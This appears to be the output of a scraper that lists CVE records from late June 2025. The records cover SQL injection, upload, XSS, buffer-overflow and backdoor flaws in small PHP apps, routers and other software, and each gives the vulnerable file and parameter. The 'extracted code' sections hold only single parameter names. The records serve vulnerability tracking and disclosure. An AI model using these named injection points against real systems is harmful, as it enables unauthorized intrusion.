Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314290 ---
iii

================================================================================


CVE ID: CVE-2025-6846
Published: 2025-06-29T05:15:21.923
Modified: 2025-07-01T00:24:47.417
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical has been found in code-projects Simple Forum 1.0. This affects an unknown part of the file /forum_viewfile.php. The manipulation of the argument Name leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://code-projects.org/ [Product]
  2. https://github.com/ez-lbz/poc/issues/16 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314289 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314289 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603346 [Third Party Advisory, VDB Entry]
  6. https://github.com/ez-lbz/poc/issues/16 [Exploit, Issue Tracking, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314289 ---
name

================================================================================


CVE ID: CVE-2025-6845
Published: 2025-06-29T05:15:21.687
Modified: 2025-07-01T00:22:08.410
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Simple Forum 1.0. It has been rated as critical. Affected by this issue is some unknown functionality of the file /register1.php. The manipulation of the argument User leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://code-projects.org/ [Product]
  2. https://github.com/ez-lbz/poc/issues/15 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314288 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314288 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603345 [Third Party Advisory, VDB Entry]
  6. https://github.com/ez-lbz/poc/issues/15 [Exploit, Issue Tracking, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314288 ---
user

================================================================================


CVE ID: CVE-2025-6462
Published: 2025-06-29T05:15:20.663
Modified: 2025-07-08T14:40:49.613
CVSS Score: 6.4 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
The EZ SQL Reports Shortcode Widget and DB Backup plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's SQLREPORT shortcode in all versions up to, and including, 5.25.11 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.

References (3):
  1. https://plugins.trac.wordpress.org/changeset/3318513/ [Patch]
  2. https://wordpress.org/plugins/elisqlreports/#developers [Product, Release Notes]
  3. https://www.wordfence.com/threat-intel/vulnerabilities/id/a6811f19-07fb-4c05-977f-90f9c5d89bb4?source=cve [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://wordpress.org/plugins/elisqlreports/#developers ---
/wp-content/plugins/

================================================================================


CVE ID: CVE-2025-6844
Published: 2025-06-29T04:15:38.570
Modified: 2025-07-01T00:37:06.470
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Simple Forum 1.0. It has been declared as critical. Affected by this vulnerability is an unknown functionality of the file /signin.php. The manipulation of the argument User leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://code-projects.org/ [Product]
  2. https://github.com/ez-lbz/poc/issues/14 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314287 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314287 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603344 [Third Party Advisory, VDB Entry]
  6. https://github.com/ez-lbz/poc/issues/14 [Exploit, Issue Tracking, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314287 ---
user

================================================================================


CVE ID: CVE-2025-6843
Published: 2025-06-29T04:15:34.907
Modified: 2025-07-10T00:52:47.117
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-284: CWE-284
  - CWE-434: Unrestricted Upload of File with Dangerous Type
  - CWE-434: Unrestricted Upload of File with Dangerous Type

Description:
A vulnerability was found in code-projects Simple Photo Gallery 1.0. It has been classified as critical. Affected is an unknown function of the file /upload-photo.php. The manipulation of the argument file_img leads to unrestricted upload. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://code-projects.org/ [Product]
  2. https://github.com/ez-lbz/poc/issues/13 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314286 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314286 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603263 [Third Party Advisory, VDB Entry]
  6. https://github.com/ez-lbz/poc/issues/13 [Exploit, Issue Tracking, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314286 ---
file_img

================================================================================


CVE ID: CVE-2025-6842
Published: 2025-06-29T04:15:29.417
Modified: 2025-07-01T14:47:11.290
CVSS Score: 4.7 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Product Inventory System 1.0 and classified as critical. This issue affects some unknown processing of the file /admin/edit_user.php. The manipulation of the argument ID leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/ez-lbz/poc/issues/12 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314285 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314285 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603208 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314285 ---
id

================================================================================


CVE ID: CVE-2025-6841
Published: 2025-06-29T03:15:21.843
Modified: 2025-07-01T14:58:33.577
CVSS Score: 4.7 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability has been found in code-projects Product Inventory System 1.0 and classified as critical. This vulnerability affects unknown code of the file /admin/edit_product.php. The manipulation of the argument ID leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/ez-lbz/poc/issues/11 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314284 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314284 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603207 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314284 ---
id

================================================================================


CVE ID: CVE-2025-6840
Published: 2025-06-29T03:15:21.580
Modified: 2025-07-01T15:07:52.753
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, was found in code-projects Product Inventory System 1.0. This affects an unknown part of the file /index.php of the component Login. The manipulation of the argument Username leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/ez-lbz/poc/issues/10 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314283 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314283 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603200 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314283 ---
username

================================================================================


CVE ID: CVE-2025-6839
Published: 2025-06-29T02:15:21.747
Modified: 2025-06-30T18:38:23.493
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-912: CWE-912

Description:
A vulnerability, which was classified as critical, has been found in Conjure Position Department Service Quality Evaluation System up to 1.0.11. Affected by this issue is the function eval of the file public/assets/less/bootstrap-less/mixins/head.php. The manipulation of the argument payload leads to backdoor. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://note-hxlab.wetolink.com/share/LZJIef0phS6B
  2. https://note-hxlab.wetolink.com/share/LZJIef0phS6B#proof-of-concept-
  3. https://vuldb.com/?ctiid.314282
  4. https://vuldb.com/?id.314282
  5. https://vuldb.com/?submit.603176

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314282 ---
eval

eval

payload

================================================================================


CVE ID: CVE-2025-6837
Published: 2025-06-29T01:15:21.527
Modified: 2025-07-01T17:27:34.200
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-284: CWE-284
  - CWE-434: Unrestricted Upload of File with Dangerous Type
  - CWE-434: Unrestricted Upload of File with Dangerous Type

Description:
A vulnerability classified as critical was found in code-projects Library System 1.0. Affected by this vulnerability is an unknown functionality of the file /profile.php. The manipulation of the argument image leads to unrestricted upload. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/blueandhack/cve/issues/7 [Exploit, Issue Tracking, Third Party Advisory, Mitigation]
  3. https://vuldb.com/?ctiid.314281 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314281 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603154 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314281 ---
image

================================================================================


CVE ID: CVE-2025-6836
Published: 2025-06-29T01:15:21.267
Modified: 2025-07-01T15:33:33.943
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical has been found in code-projects Library System 1.0. Affected is an unknown function of the file /profile.php. The manipulation of the argument phone leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. Other parameters might be affected as well.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/blueandhack/cve/issues/4 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314280 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314280 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603145 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314280 ---
phone

================================================================================


CVE ID: CVE-2025-6835
Published: 2025-06-29T00:15:21.207
Modified: 2025-07-01T13:51:34.580
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Library System 1.0. It has been rated as critical. This issue affects some unknown processing of the file /student-issue-book.php. The manipulation of the argument reg leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/blueandhack/cve/issues/6 [Exploit, Third Party Advisory, Issue Tracking]
  3. https://vuldb.com/?ctiid.314279 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314279 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603142 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314279 ---
reg

================================================================================


CVE ID: CVE-2025-6834
Published: 2025-06-29T00:15:20.953
Modified: 2025-07-01T18:27:48.017
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Inventory Management System 1.0. It has been declared as critical. This vulnerability affects unknown code of the file /php_action/editPayment.php. The manipulation of the argument orderId leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (7):
  1. https://code-projects.org/ [Product]
  2. https://github.com/xiaoqitc/cve-/issues/5 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314278 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314278 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603127 [Third Party Advisory, VDB Entry]
  6. https://vuldb.com/?submit.603855 [Third Party Advisory, VDB Entry]
  7. https://github.com/xiaoqitc/cve-/issues/5 [Exploit, Issue Tracking, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314278 ---
orderId

================================================================================


CVE ID: CVE-2025-6829
Published: 2025-06-28T23:15:22.277
Modified: 2025-07-08T14:41:05.270
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in aaluoxiang oa_system up to c3a08168c144f27256a90838492c713f55f1b207 and classified as critical. This issue affects the function outAddress of the component External Address Book Handler. The manipulation leads to sql injection. The attack may be initiated remotely. This product does not use versioning. This is why information about affected and unaffected releases are unavailable.

References (5):
  1. https://github.com/chujianxin0101/vuln/issues/5 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://vuldb.com/?ctiid.314267 [Permissions Required]
  3. https://vuldb.com/?id.314267 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603033 [Third Party Advisory, VDB Entry]
  5. https://github.com/chujianxin0101/vuln/issues/5 [Exploit, Third Party Advisory, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314267 ---
outAddress

outAddress

================================================================================


CVE ID: CVE-2025-6828
Published: 2025-06-28T23:15:22.053
Modified: 2025-07-01T18:37:44.973
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability has been found in code-projects Inventory Management System 1.0 and classified as critical. This vulnerability affects unknown code of the file /orders.php. The manipulation of the argument i leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://code-projects.org/ [Product]
  2. https://github.com/YunQipao/cve/issues/2 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314266 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314266 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603000 [Third Party Advisory, VDB Entry]
  6. https://github.com/YunQipao/cve/issues/2 [Exploit, Issue Tracking, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314266 ---
i

================================================================================


CVE ID: CVE-2025-53392
Published: 2025-06-28T23:15:21.503
Modified: 2025-06-30T18:38:23.493
CVSS Score: 5.0 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N

CWE Categories:
  - CWE-36: CWE-36

Description:
In Netgate pfSense CE 2.8.0, the "WebCfg - Diagnostics: Command" privilege allows reading arbitrary files via diag_command.php dlPath directory traversal. NOTE: the Supplier's perspective is that this is intended behavior for this privilege level, and that system administrators are informed through both the product documentation and UI.

References (2):
  1. https://github.com/skraft9/pfsense-security-research
  2. https://github.com/skraft9/pfsense-security-research

Attempting to extract code examples from references...

--- Code from https://github.com/skraft9/pfsense-security-research ---
CVE-2025-53392

CWE-36

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N

================================================================================


CVE ID: CVE-2025-53391
Published: 2025-06-28T22:15:23.600
Modified: 2025-06-30T18:38:23.493
CVSS Score: 9.3 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

CWE Categories:
  - CWE-863: Incorrect Authorization

Description:
The Debian zuluPolkit/CMakeLists.txt file for zuluCrypt through the zulucrypt_6.2.0-1 package has insecure PolicyKit allow_any/allow_inactive/allow_active settings that allow a local user to escalate their privileges to root.

References (4):
  1. https://bugs.debian.org/1108288
  2. https://deb.debian.org/debian/pool/main/z/zulucrypt/zulucrypt_6.2.0-1.dsc
  3. https://salsa.debian.org/debian/zulucrypt/-/blob/9d661c9f384c4d889d3387944e14ac70cfb9684b/debian/patches/fix_zulupolkit_policy.patch
  4. https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1108288

Attempting to extract code examples from references...

--- Code from https://bugs.debian.org/1108288 ---
debian-bugs-dist@lists.debian.org, marciosouza@debian.org, adrelanos@whonix.org, arraybolt3@ubuntu.com, Marcio de Souza Oliveira &lt;marciosouza@debian.org&gt;

Bug#1108288

src:zulucrypt

================================================================================


CVE ID: CVE-2025-6826
Published: 2025-06-28T21:15:30.627
Modified: 2025-07-11T16:26:59.697
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, has been found in code-projects Payroll Management System 1.0. Affected by this issue is some unknown functionality of the file /Payroll_Management_System/ajax.php?action=save_department. The manipulation of the argument ID leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://code-projects.org/ [Product]
  2. https://github.com/Cashbeebee/CVE/issues/1 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314264 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314264 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602674 [Third Party Advisory, VDB Entry]
  6. https://github.com/Cashbeebee/CVE/issues/1 [Exploit, Issue Tracking, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314264 ---
id

================================================================================


CVE ID: CVE-2025-6825
Published: 2025-06-28T21:15:29.613
Modified: 2025-07-08T14:44:21.627
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
A vulnerability classified as critical was found in TOTOLINK A702R up to 4.0.0-B20230721.1521. Affected by this vulnerability is an unknown functionality of the file /boafrm/formWlSiteSurvey of the component HTTP POST Request Handler. The manipulation of the argument submit-url leads to buffer overflow. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (8):
  1. https://github.com/awindog/cve/blob/main/688/29.md [Exploit, Third Party Advisory]
  2. https://github.com/awindog/cve/blob/main/688/29.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314263 [Permissions Required]
  4. https://vuldb.com/?id.314263 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602655 [Third Party Advisory, VDB Entry]
  6. https://www.totolink.net/ [Product]
  7. https://github.com/awindog/cve/blob/main/688/29.md [Exploit, Third Party Advisory]
  8. https://github.com/awindog/cve/blob/main/688/29.md#poc [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314263 ---
submit-url

================================================================================


CVE ID: CVE-2025-6824
Published: 2025-06-28T20:15:23.917
Modified: 2025-07-01T00:33:14.560
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
A vulnerability classified as critical has been found in TOTOLINK X15 up to 1.0.0-B20230714.1105. Affected is an unknown function of the file /boafrm/formParentControl of the component HTTP POST Request Handler. The manipulation of the argument submit-url leads to buffer overflow. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (8):
  1. https://github.com/awindog/cve/blob/main/688/28.md [Exploit, Third Party Advisory]
  2. https://github.com/awindog/cve/blob/main/688/28.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314262 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314262 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602643 [Third Party Advisory, VDB Entry]
  6. https://www.totolink.net/ [Product]
  7. https://github.com/awindog/cve/blob/main/688/28.md [Exploit, Third Party Advisory]
  8. https://github.com/awindog/cve/blob/main/688/28.md#poc [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314262 ---
submit-url

================================================================================


CVE ID: CVE-2025-6823
Published: 2025-06-28T20:15:22.973
Modified: 2025-07-01T13:58:38.780
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Inventory Management System 1.0. It has been rated as critical. This issue affects some unknown processing of the file /php_action/editProduct.php. The manipulation of the argument editProductName leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://code-projects.org/ [Product]
  2. https://github.com/Dav1d-safe/cve/issues/1 [Exploit, Third Party Advisory, Issue Tracking]
  3. https://vuldb.com/?ctiid.314261 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314261 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602642 [Third Party Advisory, VDB Entry]
  6. https://github.com/Dav1d-safe/cve/issues/1 [Exploit, Third Party Advisory, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314261 ---
editProductName

================================================================================


CVE ID: CVE-2025-6822
Published: 2025-06-28T19:15:23.143
Modified: 2025-07-01T14:10:47.767
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Inventory Management System 1.0. It has been declared as critical. This vulnerability affects unknown code of the file /php_action/removeProduct.php. The manipulation of the argument productId leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://code-projects.org/ [Product]
  2. https://github.com/Dav1d-safe/cve/issues/2 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314260 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314260 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602641 [Third Party Advisory, VDB Entry]
  6. https://github.com/Dav1d-safe/cve/issues/2 [Exploit, Issue Tracking, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314260 ---
productId

================================================================================


CVE ID: CVE-2025-6820
Published: 2025-06-28T18:15:21.033
Modified: 2025-07-01T18:49:29.030
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Inventory Management System 1.0 and classified as critical. Affected by this issue is some unknown functionality of the file /php_action/createProduct.php. The manipulation of the argument productName leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/AlbaDove/cve/issues/3 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314258 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314258 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602617 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314258 ---
productName

================================================================================


CVE ID: CVE-2025-6819
Published: 2025-06-28T17:15:24.960
Modified: 2025-07-01T18:57:42.687
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability has been found in code-projects Inventory Management System 1.0 and classified as critical. Affected by this vulnerability is an unknown functionality of the file /php_action/removeBrand.php. The manipulation of the argument brandId leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/AlbaDove/cve/issues/2 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314257 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314257 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602609 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314257 ---
brandId

================================================================================


CVE ID: CVE-2025-6818
Published: 2025-06-28T16:15:23.977
Modified: 2025-07-08T14:45:44.340
CVSS Score: 3.3 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-122: CWE-122

Description:
A vulnerability, which was classified as problematic, was found in HDF5 1.14.6. Affected is the function H5O__chunk_protect of the file /src/H5Ochunk.c. The manipulation leads to heap-based buffer overflow. An attack has to be approached locally. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/HDFGroup/hdf5/issues/5573 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://github.com/user-attachments/files/20623382/hdf5_crash_5.txt [Exploit]
  3. https://vuldb.com/?ctiid.314256 [Permissions Required]
  4. https://vuldb.com/?id.314256 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602326 [Third Party Advisory, VDB Entry]
  6. https://github.com/HDFGroup/hdf5/issues/5573 [Exploit, Third Party Advisory, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://github.com/HDFGroup/hdf5/issues/5573 ---
H5O__chunk_protect

src/H5Ochunk.c:178:44

